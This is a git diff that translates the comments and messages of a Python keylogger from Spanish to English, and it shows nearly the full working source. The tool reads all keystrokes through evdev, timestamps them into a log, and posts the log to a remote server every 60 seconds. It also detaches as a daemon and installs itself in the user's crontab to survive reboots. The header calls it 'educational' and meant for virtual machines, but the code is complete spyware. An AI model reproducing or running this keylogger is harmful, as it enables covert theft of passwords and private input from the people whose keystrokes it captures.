@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-Keylogger educacional con múltiples características.
-Usar solo en un ambiente controlado como máquina virtuales.
+Educational keylogger with multiple features.
+Use only in a controlled environment such as virtual machines.
 """
 
 #######################################
-# #       Importar Librerías        # #
+# #       Import Libraries        # #
 #######################################
 
 import os
@@ -17,41 +17,41 @@ import datetime
 import subprocess
 
 # ------------------------------------------------------------
-# Importar librerías de terceros y configurar el entorno virtual de python
+# Import third-party libraries and configure python virtual environment
 # ------------------------------------------------------------
 
 VENV_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_env")
 REQUIRED = ["evdev", "requests"]
 
 def in_venv():
-  #Detecta si ya estamos en el entorno virtual
+  # Detect if we are already in a virtual environment
 	return (hasattr(sys, "real_prefix") or (sys.prefix != sys.base_prefix))
 
 def bootstrap_venv():
-	#Crea el venv, instala dependencias y re-ejecuta el script dentro de él de ser necesario
+	# Creates the venv, install dependencies and re-execute the script within it if necessary
 	if in_venv():
 		return #Estamos dentro
-	print("No se detecto entorno virtual. Creandolo...")
+	print("No virtual environment found. Creating it...")
 	if not os.path.exists(VENV_DIR):
 		subprocess.run([sys.executable, "-m", "venv", VENV_DIR], check=True)
 
 	pip_path = os.path.join(VENV_DIR, "bin", "pip")
 	python_path = os.path.join(VENV_DIR, "bin", "python")
-	print("Actualizando pip y setupyools en el venv...")
+	print("Updating pip and setupyools in the venv...")
 	subprocess.run([python_path, "-m", "pip", "install", "--upgrade", "pip"], check=True)
 	subprocess.run([python_path, "-m", "pip", "install", "setuptools==75.8.0"], check=True)
 
-	print("Instalando dependencias...")
+	print("Installing dependencies...")
 	subprocess.run([python_path, "-m", "pip", "install"] + REQUIRED, check=True)
 
-	print("Re-lanzando dentro del venv...")
+	print("Re-executing within the venv")
 	os.execv(python_path, [python_path] + sys.argv)
 
 bootstrap_venv()
 
-print(f"Ejecutando dentro de: {sys.prefix}")
+print(f"Executing on: {sys.prefix}")
 
-# Importando las librerías restantes
+# Importing the remaining libraries
 import threading
 from evdev import InputDevice, categorize, ecodes, list_devices
 import requests
@@ -64,28 +64,28 @@ import requests
 #######################################
 
 # ------------------------------------------------------------
-# Configuración
+# Configuration
 # ------------------------------------------------------------
 CONFIG_FILE = "config.json"
 
 DEFAULT_CONFIG = {
     "log_file": "keylogger.log",
-    "remote_url": "http://<IP>:<Port>/log",  #IP a donde se envía el archivo. 
-    "send_interval": 60,               # Intervalo de tiempo para enviar el archivo (60 segundos).
-    "max_log_size_mb": 0.01,              # Rotar el archivo cuando el tamaño se sobrepase (10 kb).
-    "daemon": True,                    # Se ejecuta como un daemon en el background.
-    "persistence": True,               # Se añade a Crontab para iniciar automáticamente.
-    "terminate_key": "<esc>",           # Tecla para terminar el keylogger.
-    "timestamp_format": "%Y-%m-%d %H:%M:%S" #Formato para el timestamp de cada tecla
+    "remote_url": "http://<IP>:<Port>/log",  # IP where the file will be sent. 
+    "send_interval": 60,               # Time interval to send the file (default 60 seconds).
+    "max_log_size_mb": 0.01,              # Rotates the file when it surpases the size (default 10kb)
+    "daemon": True,                    # If True it is executed as a daemon in the background.
+    "persistence": True,               # If True it adds itself to the Crontab file.
+    "terminate_key": "<esc>",           # Key to stop the keylogger.
+    "timestamp_format": "%Y-%m-%d %H:%M:%S" # Timestamp format for each keystroke.
 }
 
 
 #######################################
-# #             Funciones           # #
+# #             Functions          # #
 #######################################
 
 def load_config():
-    """Carga la configuración del archivo JSON si ya existe  o en caso contrario lo crea con la configuración por defecto."""
+	"""Loads the configuration of the JSON file if it already exists or it creates a new one with the assigned configuration."""
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, 'r') as f:
             config = json.load(f)
@@ -96,13 +96,13 @@ def load_config():
         config = DEFAULT_CONFIG.copy()
         with open(CONFIG_FILE, 'w') as f:
             json.dump(config, f, indent=4)
-        print(f"Archivo de configuración creado: {CONFIG_FILE}")
+        print(f"Config file created: {CONFIG_FILE}")
     return config
 
 
 # ------------------------------------------------------------
-# Daemonization (Solo para Unix).
-# Separa el proceso de la terminal y lo ejecuta en segundo plano
+# Daemonization (Only for Unix).
+# Separates the terminal process and executes it in the background
 # ------------------------------------------------------------
 def daemonize():
     if os.fork() > 0:
@@ -120,26 +120,26 @@ def daemonize():
 
 
 # ------------------------------------------------------------
-# Persistencia (crontab)
-# Añade un script recurrente al crontab del usuario para ejecutarse al reiniciar el equipo
+# Persistence (crontab)
+# Adds a recurring script to the user's crontab to run when the computer restarts
 # ------------------------------------------------------------
 def add_persistence(script_path):
     try:
-        # Revisa si ya existe la línea en el crontab
+        # Chekcs if the line already exists in the crontab file
         existing = subprocess.check_output("crontab -l", shell=True, text=True, stderr=subprocess.DEVNULL)
         if script_path in existing:
-            return  # La línea existe
+            return  # The line exists
     except subprocess.CalledProcessError:
         existing = ""  # No crontab yet
 
-    # Añade la línea al script para que se inicie automáticamente.
+    # Adds the line to the script
     cron_line = f"@reboot /usr/bin/python3 {script_path} >/dev/null 2>&1\n"
     new_cron = existing + cron_line
     with open("/tmp/current_cron", "w") as f:
         f.write(new_cron)
     subprocess.call("crontab /tmp/current_cron", shell=True)
     os.remove("/tmp/current_cron")
-    print("Persistencia añadida a crontab.")
+    print("Persistence added.")
 
 
 #######################################
@@ -160,30 +160,30 @@ class Keylogger:
         self.max_log_size = config.get("max_log_size_mb", 1) * 1024 * 1024
 
 
-        # Se abre el archivo log en modo "append"
+        # Opens the log file on "append" mode
         self.output = open(self.log_file, "a")
 
-        # Iniciamos el timer para que se envie periódicamente
+        # The timer starts to allow the file to be send periodically
         self.last_send = time.time()
 
-        # Register de limpieza al terminar.
+        # Register to clean the terminal
         atexit.register(self.cleanup)
 
-        #Detectar el teclado
+        # Detects the keyboard
         self.device = self._find_keyboard()
         if self.device is None:
-            print("ERROR: No se encontro ninguna teclado")
+            print("ERROR: No keyboard found")
             sys.exit(1)
 
-        print(f"Usando dispositivo: {self.device.name}")
+        print(f"Using device: {self.device.name}")
 
-        #Variables de control para el listener y el bucle infinito del listener
+        # Control variables for the listener and the infinite loop
         self.running = True
         self.listener_thread = threading.Thread(target=self._event_loop, daemon=True)
         self.listener_thread.start()
 
     def _find_keyboard(self):
-        """Busca el primer dispositivo que parezca un teclado"""
+        """Searches for the first device that looks like a keyboard"""
         devices = [InputDevice(path) for path in list_devices()]
         for dev in devices:
             if "keyboard" in dev.name.lower():
@@ -192,13 +192,13 @@ class Keylogger:
 
 
     def _event_loop(self):
-        """Lee eventos en un hilo separado"""
+        """Reads events in a different thread"""
         for event in self.device.read_loop():
             if not self.running:
                 break
             if event.type == ecodes.EV_KEY:
                key_event = categorize(event)
-               # Solo procesar pulsaciones (key down), ignora repeticiones y soltadas
+               # Only process key downs, ignores repetitions and key releases
                if key_event.keystate == 1:
                    self.on_press(key_event)
 
@@ -207,21 +207,20 @@ class Keylogger:
     def on_press(self, key_event):
 
         print(f"Tecla: {key_event}")
-        # Callback para el evento de una tecla presionada
+        # Callback for the keystroke event
         try:
             timestamp = datetime.datetime.now().strftime(self.timestamp_format)
 
-            # Obtener el nombre de la tecla (ej. "KEY_A")
+            # Obtain the key's name (e.g. "KEY_A")
             keycode = key_event.keycode
-            """ Formatear para el log: si es una letra, mostrar el caracter, 
-            si es especial, entre corchetes. """
+            """Format for the log."""
             if keycode.startswith("KEY_"):
-                key_str = keycode[4:] # Quitar el KEY_
+                key_str = keycode[4:] # Remove the KEY_
                 if len(key_str) == 1:
-                     # Tecla de letra o numero: usar el carácter en minúscula.
+                     # If the key is a letter use the lowercase form.
                      keystr = key_str.lower()
                 else:
-                    # Tecla especial: poner corchetes.
+                    # Special keys inside brackets
                     keystr = f"[{key_str.lower()}]"
             else:
                 keystr = f"[{keycode}]"
@@ -233,29 +232,29 @@ class Keylogger:
             self.output.flush()
 
 
-            # Chequear la rotación del log
+            # Check the log rotation
             self.check_rotation()
 
-            # Enviar el log periodicamente cuando el intervalo se cumpla
+            # Sends the log periodically when the time is up
             if self.remote_url and time.time() - self.last_send > self.send_interval:
                 self.send_file(self.log_file)
 
-            # Detenerlo si se presiona la tecla configurada en el JSON
+            # Stops if the assigned key on the JSON file is detected
             if self.terminate_key:
-                # Convertir la tecla de terminacion a su equivalente en evdev
+                # Converts the termination key into its evdev equivalent
                 term_code = self._terminate_key_to_code(self.terminate_key)
                 if term_code and key_event.keycode == term_code:
-                    print("Tecla de terminación presionada, deteniendo...")
+                    print("Termination key detected, stoping...")
                     self.running = False
 
         except Exception as e:
-            # Imprime el error
-            print(f"Error en callback: {e}")
+            # Prints error
+            print(f"Callback error: {e}")
 
 
     def _terminate_key_to_code(self, key_str):
-        """Convierte una cadena como  <esc> a su keycode para evdev """
-        # Mapeo de nombres comunes
+        """Converts a chain like <esc> into its evdev keycode"""
+        # Common names
         mapping = {
             "<esc>": "KEY_ESC",
             "<enter>": "KEY_ENTER",
@@ -276,7 +275,7 @@ class Keylogger:
 
 
     def check_rotation(self):
-        # Rotar el archivo log si se excede del tamaño máximo.
+        # Rotates the log file when it surpases the max size configured
         try:
             if os.path.getsize(self.log_file) > self.max_log_size:
                 self.output.close()
@@ -286,29 +285,29 @@ class Keylogger:
 
                 self.output = open(self.log_file, "a")
         except Exception as e:
-            print(f"Error en la rotación: {e}")
+            print(f"Rotation error: {e}")
 
     def send_file(self, filepath):
-        """Envía el archivo .log a un servidor remoto via HTTP POST."""
+        """Sends the .log file to a remote server through HTTP POST"""
         try:
             with open(filepath, 'rb') as f:
                 content = f.read()
-            # Envía el contenido
+            # Sends the content
             requests.post(self.remote_url, data=content, timeout=5)
             self.last_send = time.time()
         except Exception as e:
-            print(f"Fallo al enviar {filepath}: {e}")
+            print(f"Failed to send {filepath}: {e}")
 
 
     def cleanup(self):
-        """Cierra el archivo y se envia una ultima vez."""
+        """Closes the file and it is send one last time"""
         self.running = False
         if self.remote_url:
             self.send_file(self.log_file)
         self.output.close()
         if hasattr(self, 'device'):
             self.device.close()
-        print("Keylogger detenido.")
+        print("Keylogger stopped.")
 
 
 #######################################
@@ -318,24 +317,24 @@ class Keylogger:
 def main():
     config = load_config()
 
-    #Forzar que el log file se cree en el directorio /tmp
+    #Forces the creating of the log file into the directory /tmp
     config["log_file"] = os.path.join("/tmp", os.path.basename(config["log_file"]))
 
-    # Ejecutar la daemonización si se indico
+    # Executes the daemonization (if assigned)
     if config.get("daemon"):
         daemonize()
 
-    # Ejecutar la persistencia si se indico
+    # Executes persistence (if assigned)
     if config.get("persistence"):
         script_path = os.path.abspath(sys.argv[0])
         add_persistence(script_path)
 
-    # Crea y ejecuta el keylogger
+    # Creates and execute the keylogger
     kl = Keylogger(config)
     print("Keylogger inicado. Presiona Ctrl+C para detener.")
     print(f"Log file: {kl.log_file}")
     print(f"El archivo existe? {os.path.exists(kl.log_file)}")
-    # Mantiene el main thread vivo mientras el listener se está ejecutando.
+    # Keeps the main thread alive while the listener is up
     try:
         while kl.running:
             time.sleep(0.1)
